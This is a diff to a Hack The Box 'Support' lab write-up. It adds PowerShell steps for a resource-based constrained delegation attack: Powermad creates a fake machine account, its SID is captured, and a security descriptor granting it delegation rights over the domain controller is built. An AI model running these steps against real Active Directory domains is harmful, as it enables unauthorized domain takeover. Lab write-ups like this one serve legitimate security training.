@@ -351,7 +351,7 @@ Mode                 LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\support\Documents> . .\powerview.ps1
 ```
 
-### Verify Environment
+### Verify Environment - Bloodhound & PowerView
 
 In Bloodhound, we saw that the name of the target computer is `DC.SUPPORT.HTB` and, by clicking the node and looking at "unrolled admins", we can see that the admin on the target machine is `ADMINISTRATOR@SUPPORT.HTB`.
 
@@ -387,9 +387,30 @@ name msds-allowedtoactonbehalfofotheridentity
 DC
 ```
 
-### Create FakeComputer
+### Create FakeComputer - PowerMad
 
+Used the Powermad `New-MachineAccount` to create a fake computer:
 
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)
+[+] Machine account 0xdfFakeComputer added
+```
+
+I need the SID of the computer object as well, so I’ll save it in a variable:
+
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> $fakesid = Get-DomainComputer 0xdfFakeComputer | select -expand objectsid
+*Evil-WinRM* PS C:\Users\support\Documents> $fakesid
+S-1-5-21-1677581083-3380853377-188903654-5601
+```
+
+### Attack
+
+Now I’ll configure the DC to trust my fake computer to make authorization decisions on it’s behalf. These commands will create an ACL with the fake computer’s SID and assign that to the DC:
+
+```bash
+*Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
+```
 
 
 # Resources
